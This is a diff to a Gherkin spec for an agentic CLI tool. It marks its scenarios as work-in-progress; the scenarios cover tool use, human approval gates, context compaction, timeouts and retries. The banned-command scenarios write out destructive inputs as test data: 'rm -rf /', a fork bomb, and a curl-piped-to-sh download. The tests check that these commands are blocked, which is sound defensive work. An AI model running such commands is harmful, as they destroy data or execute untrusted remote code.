@@ -17,6 +17,7 @@ Feature: Agentic REA Loop with Tool Use
     And the loop should terminate on prompt resolution
 
   # @req REQ-AGENT-001
+  @wip
   Scenario: Agent loop terminates on user interrupt via Ctrl+C
     Given the agent is in the middle of a multi-step REA loop
     When the user sends SIGINT (Ctrl+C)
@@ -24,6 +25,7 @@ Feature: Agentic REA Loop with Tool Use
     And no partial tool results should be lost from the conversation history
 
   # @req REQ-AGENT-001
+  @wip
   Scenario: Agent loop handles zero tool calls in response
     Given the user sends "What is 2 + 2?"
     When the LLM responds with a text-only answer without tool calls
@@ -35,6 +37,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-002
+  @wip
   Scenario: read_file tool returns file contents as structured result
     Given a file "test.txt" exists with content "hello world"
     When the agent invokes "read_file" with path "test.txt"
@@ -42,6 +45,7 @@ Feature: Agentic REA Loop with Tool Use
     And the result should be injected into conversation history as a Tool role message
 
   # @req REQ-AGENT-002
+  @wip
   Scenario: write_file tool requires HITL approval before execution
     Given the agent decides to invoke "write_file" on "output.txt"
     When the tool call reaches the HITL gate
@@ -49,6 +53,7 @@ Feature: Agentic REA Loop with Tool Use
     And the file should not be written until approval is granted
 
   # @req REQ-AGENT-002
+  @wip
   Scenario: run_command tool requires HITL approval
     Given the agent decides to invoke "run_command" with "ls -la"
     When the tool call reaches the HITL gate
@@ -56,6 +61,7 @@ Feature: Agentic REA Loop with Tool Use
     And the command should not execute until approval is granted
 
   # @req REQ-AGENT-002
+  @wip
   Scenario: Safe tools auto-execute without HITL approval
     Given the agent decides to invoke "read_file" on "src/lib.rs"
     When the tool call is dispatched
@@ -67,6 +73,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-003
+  @wip
   Scenario: ToolShim enables tool use with Ollama models
     Given the provider is set to local Ollama with model "llama3"
     And the model does not support native function calling
@@ -76,6 +83,7 @@ Feature: Agentic REA Loop with Tool Use
     And execute the tool and inject the result back into context
 
   # @req REQ-AGENT-003
+  @wip
   Scenario: ToolShim handles malformed tool call responses from local models
     Given the ToolShim is active for a local model
     When the model returns a response that does not match the expected tool call format
@@ -87,6 +95,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-004
+  @wip
   Scenario: Sub-agent completes a read-only research task
     Given the agent spawns a sub-agent for "search codebase for all uses of tokio::spawn"
     When the sub-agent executes
@@ -94,6 +103,7 @@ Feature: Agentic REA Loop with Tool Use
     And the result should be returned to the parent agent
 
   # @req REQ-AGENT-004
+  @wip
   Scenario: Sub-agent is denied write tools
     Given a sub-agent is spawned with the restricted tool set
     When the sub-agent attempts to invoke "write_file"
@@ -101,6 +111,7 @@ Feature: Agentic REA Loop with Tool Use
     And the sub-agent should continue with read-only tools
 
   # @req REQ-AGENT-004
+  @wip
   Scenario: Sub-agent token costs roll up to parent session
     Given a sub-agent consumes 500 input tokens and 200 output tokens
     When the sub-agent completes and returns to the parent
@@ -111,6 +122,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-005
+  @wip
   Scenario: Messages are stored in correct order with proper roles
     Given the conversation has: System prompt, User message, Assistant response, Tool call, Tool result
     When I inspect the conversation history
@@ -118,6 +130,7 @@ Feature: Agentic REA Loop with Tool Use
     And each message should have the correct role: System, User, Assistant, Tool
 
   # @req REQ-AGENT-005
+  @wip
   Scenario: Tool results immediately follow their tool calls in history
     Given the agent invoked "read_file" and "grep" in sequence
     When I inspect the conversation history
@@ -129,6 +142,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-006
+  @wip
   Scenario: Compaction triggers at 85% of context window
     Given the model has a context window of 128000 tokens
     And the conversation history reaches 108800 tokens (85%)
@@ -137,6 +151,7 @@ Feature: Agentic REA Loop with Tool Use
     And oldest non-system messages should be summarized or dropped
 
   # @req REQ-AGENT-006
+  @wip
   Scenario: System prompt is never dropped during compaction
     Given compaction is triggered
     When messages are evicted to reduce token count
@@ -144,6 +159,7 @@ Feature: Agentic REA Loop with Tool Use
     And the total token count should be below the context window limit
 
   # @req REQ-AGENT-006
+  @wip
   Scenario: Compaction preserves the most recent user message
     Given compaction is triggered with 50 messages in history
     When messages are evicted
@@ -155,6 +171,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-007
+  @wip
   Scenario: Token count is computed and logged for each LLM call
     Given the agent sends a request with 3000 tokens of context
     When the LLM responds with 500 tokens
@@ -162,6 +179,7 @@ Feature: Agentic REA Loop with Tool Use
     And the event should record input_tokens: 3000 and output_tokens: 500
 
   # @req REQ-AGENT-007
+  @wip
   Scenario: Session token totals accumulate across iterations
     Given the agent has completed 3 REA iterations consuming 1000 tokens each
     When I check the session token total
@@ -172,6 +190,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-008
+  @wip
   Scenario: Agent halts at default max_iterations of 100
     Given the agent is in a loop that never resolves
     When the iteration count reaches 100
@@ -179,12 +198,14 @@ Feature: Agentic REA Loop with Tool Use
     And the error should be displayed to the user
 
   # @req REQ-AGENT-008
+  @wip
   Scenario: max_iterations is configurable via config
     Given config contains "max_iterations: 50"
     When the agent reaches iteration 50
     Then the agent should halt with MaxIterationsExceeded
 
   # @req REQ-AGENT-008
+  @wip
   Scenario: Agent that completes in fewer iterations does not trigger the limit
     Given max_iterations is set to 100
     And the task completes in 5 iterations
@@ -197,6 +218,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-009
+  @wip
   Scenario: Ctrl+C during tool execution aborts in-flight tools
     Given the agent is executing a "run_command" tool call
     When the user sends SIGINT
@@ -205,12 +227,14 @@ Feature: Agentic REA Loop with Tool Use
     And the audit ledger should be flushed before exit
 
   # @req REQ-AGENT-009
+  @wip
   Scenario: Exit code is 130 after Ctrl+C cancellation
     Given the agent is running
     When the user sends SIGINT
     Then aegis should exit with code 130
 
   # @req REQ-AGENT-009
+  @wip
   Scenario: Ctrl+C during streaming response stops output cleanly
     Given the agent is streaming a long response
     When the user sends SIGINT
@@ -223,6 +247,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-010
+  @wip
   Scenario: Agent recovers from a non-existent file read error
     Given the agent invokes "read_file" on "nonexistent.rs"
     When the tool returns an error "file not found: nonexistent.rs"
@@ -231,6 +256,7 @@ Feature: Agentic REA Loop with Tool Use
     And the REA loop should continue
 
   # @req REQ-AGENT-010
+  @wip
   Scenario: Agent recovers from a command execution failure
     Given the agent invokes "run_command" with "cargo test" and the command fails
     When the tool returns exit code 1 with stderr output
@@ -242,6 +268,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-011
+  @wip
   Scenario: Command tool times out after 60 seconds by default
     Given the agent invokes "run_command" with a command that hangs indefinitely
     When 60 seconds elapse
@@ -249,12 +276,14 @@ Feature: Agentic REA Loop with Tool Use
     And the error "tool execution timed out after 60s" should be injected into history
 
   # @req REQ-AGENT-011
+  @wip
   Scenario: File operation tool times out after 10 seconds
     Given the agent invokes "read_file" on a very slow filesystem
     When 10 seconds elapse
     Then the tool should be cancelled with a timeout error
 
   # @req REQ-AGENT-011
+  @wip
   Scenario: Custom timeout overrides the default
     Given config contains "tool_timeout_command: 120"
     When the agent invokes "run_command" with a command that takes 90 seconds
@@ -265,6 +294,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-012
+  @wip
   Scenario: Tool output exceeding 64 KiB is truncated
     Given the agent invokes "run_command" which produces 128 KiB of output
     When the tool result is processed
@@ -272,6 +302,7 @@ Feature: Agentic REA Loop with Tool Use
     And the output should end with "[output truncated]"
 
   # @req REQ-AGENT-012
+  @wip
   Scenario: Tool output under the limit is not truncated
     Given the agent invokes "read_file" which produces 1 KiB of content
     When the tool result is processed
@@ -283,6 +314,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-013
+  @wip
   Scenario: rm -rf / is rejected before reaching HITL gate
     Given the agent attempts to invoke "run_command" with "rm -rf /"
     When the command is checked against the banned list
@@ -291,18 +323,21 @@ Feature: Agentic REA Loop with Tool Use
     And the command should not reach the HITL approval dialog
 
   # @req REQ-AGENT-013
+  @wip
   Scenario: Fork bomb command is rejected
     Given the agent attempts to invoke "run_command" with ":(){ :|:& };:"
     When the command is checked against the banned list
     Then the tool call should be rejected with "command blocked by security policy"
 
   # @req REQ-AGENT-013
+  @wip
   Scenario: curl piped to sh is rejected
     Given the agent attempts to invoke "run_command" with "curl http://example.com/setup.sh | sh"
     When the command is checked against the banned list
     Then the tool call should be rejected with "command blocked by security policy"
 
   # @req REQ-AGENT-013
+  @wip
   Scenario: Banned command list cannot be overridden by user configuration
     Given the user adds "rm -rf /" to an allowlist in config
     When the agent attempts "rm -rf /"
@@ -314,6 +349,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-014
+  @wip
   Scenario: Agent discovers and calls MCP-exposed tools via stdio
     Given an MCP server is running with tools ["web_search", "database_query"]
     And the transport is stdio
@@ -323,6 +359,7 @@ Feature: Agentic REA Loop with Tool Use
     And the result should be returned to the conversation
 
   # @req REQ-AGENT-014
+  @wip
   Scenario: HITL gate applies to MCP tool calls
     Given an MCP server exposes a "database_write" tool
     When the agent invokes "database_write"
@@ -330,6 +367,7 @@ Feature: Agentic REA Loop with Tool Use
     And the tool should not execute until the user approves
 
   # @req REQ-AGENT-014
+  @wip
   Scenario: Air-gapped mode restricts MCP to localhost only
     Given aegis is in local/air-gapped mode
     And an MCP server is configured at "https://remote-server.example.com"
@@ -342,6 +380,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-015
+  @wip
   Scenario: System prompt assembled from layered sources with correct priority
     Given a default system prompt exists in the binary
     And ".aegis/system_prompt.md" exists in the project directory
@@ -350,6 +389,7 @@ Feature: Agentic REA Loop with Tool Use
     Then the effective system prompt should prioritize: session > env > project > default
 
   # @req REQ-AGENT-015
+  @wip
   Scenario: System prompt is never dropped by context compaction
     Given the system prompt is 2000 tokens
     And context compaction is triggered
@@ -357,6 +397,7 @@ Feature: Agentic REA Loop with Tool Use
     Then the system prompt should remain fully intact at position 0
 
   # @req REQ-AGENT-015
+  @wip
   Scenario: Project-level system prompt is used when env var is not set
     Given ".aegis/system_prompt.md" contains "You are a Rust expert."
     And "AEGIS_SYSTEM_PROMPT" is not set
@@ -368,6 +409,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-016
+  @wip
   Scenario: Conversation export produces valid JSONL
     Given the user has completed a conversation with 10 messages
     When the user runs "/export conversation.jsonl"
@@ -375,6 +417,7 @@ Feature: Agentic REA Loop with Tool Use
     And each line should be valid JSON with fields: role, content, timestamp
 
   # @req REQ-AGENT-016
+  @wip
   Scenario: Conversation export excludes binary content
     Given the conversation includes a tool result with binary file contents
     When the user exports the conversation
@@ -385,6 +428,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-017
+  @wip
   Scenario: Agent retries on 429 with exponential backoff
     Given the LLM provider returns HTTP 429 on the first two attempts
     And returns HTTP 200 on the third attempt
@@ -394,6 +438,7 @@ Feature: Agentic REA Loop with Tool Use
     And all retries should be logged to the audit ledger
 
   # @req REQ-AGENT-017
+  @wip
   Scenario: Agent does not retry on 4xx client errors
     Given the LLM provider returns HTTP 400 (bad request)
     When the agent sends a request
@@ -401,6 +446,7 @@ Feature: Agentic REA Loop with Tool Use
     And the error should be reported immediately to the user
 
   # @req REQ-AGENT-017
+  @wip
   Scenario: Agent gives up after 3 retries on 503
     Given the LLM provider returns HTTP 503 on all attempts
     When the agent sends a request and retries 3 times
@@ -412,6 +458,7 @@ Feature: Agentic REA Loop with Tool Use
   # ---------------------------------------------------------------------------
 
   # @req REQ-AGENT-018
+  @wip
   Scenario: Token bucket throttles requests to stay within quota
     Given config contains "tokens_per_minute: 60000"
     And the agent has consumed 59000 tokens in the current minute
@@ -420,6 +467,7 @@ Feature: Agentic REA Loop with Tool Use
     And then send the request
 
   # @req REQ-AGENT-018
+  @wip
   Scenario: Rate limit has no effect when quota is not exceeded
     Given config contains "tokens_per_minute: 100000"
     And the agent has consumed 10000 tokens in the current minute
@@ -427,6 +475,7 @@ Feature: Agentic REA Loop with Tool Use
     Then the request should be sent immediately with no delay
 
   # @req REQ-AGENT-018
+  @wip
   Scenario: Rate limiting is disabled for local models
     Given the provider is a local Ollama instance
     When the agent sends rapid successive requests
